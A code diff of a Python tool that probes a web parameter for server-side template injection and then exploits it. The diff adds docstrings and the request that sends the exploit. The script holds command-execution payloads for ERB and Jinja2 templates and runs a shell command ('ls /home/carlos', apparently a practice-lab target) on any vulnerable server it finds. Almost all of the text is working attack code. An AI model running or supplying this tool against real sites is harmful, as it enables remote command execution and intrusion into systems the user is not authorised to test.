@@ -1,7 +1,6 @@
 import requests
 from urllib.parse import quote
 
-# List of common SSTI payloads for different template engines
 payloads = {
     "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
     "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
@@ -10,11 +9,29 @@ payloads = {
 }
 
 def check_and_exploit_ssti(url):
+    """
+    Checks for and exploits SSTI vulnerabilities on a given URL.
+    
+    Args:
+        url (str): The URL to test for SSTI vulnerabilities.
+    
+    Returns:
+        list: A list of results indicating detected SSTI vulnerabilities.
+    """
     param = "message"
     results = []
 
-    # Function to check SSTI vulnerability
     def check_ssti(url, param):
+        """
+        Checks for SSTI vulnerabilities using predefined payloads.
+        
+        Args:
+            url (str): The URL to test.
+            param (str): The parameter to inject the payload into.
+        
+        Returns:
+            tuple: A tuple indicating whether SSTI was detected and the engine used.
+        """
         for engine, tests in payloads.items():
             for payload in tests:
                 encoded_payload = quote(payload)
@@ -30,12 +47,19 @@ def check_and_exploit_ssti(url):
         
         return False, None
 
-    # Function to exploit SSTI vulnerability
     def exploit_ssti(url, param, engine, command):
+        """
+        Exploits SSTI vulnerabilities using the detected engine and a command.
+        
+        Args:
+            url (str): The URL to exploit.
+            param (str): The parameter to inject the exploit payload into.
+            engine (str): The engine used for SSTI.
+            command (str): The command to execute.
+        """
         if engine not in payloads:
             return
         
-        # Select appropriate payload for command execution
         if engine == "erb":
             exploit_payload = f"<%= system('{command}') %>"
         elif engine == "jinja2":
@@ -49,11 +73,15 @@ def check_and_exploit_ssti(url):
         
         encoded_payload = quote(exploit_payload)
         exploit_url = f"{url}?{param}={encoded_payload}"
+        try:
+            response = requests.get(exploit_url)
+            if response.status_code == 200:
+                print(f"Exploitation result: {response.text}")
+        except requests.RequestException as e:
+            print(f"Error exploiting SSTI: {e}")
 
-    # Detect and exploit SSTI
     ssti_detected, engine = check_ssti(url, param)
     if ssti_detected:
-        # Replace 'ls /home/carlos' with the command you want to execute
         exploit_ssti(url, param, engine, "ls /home/carlos")
 
     return results
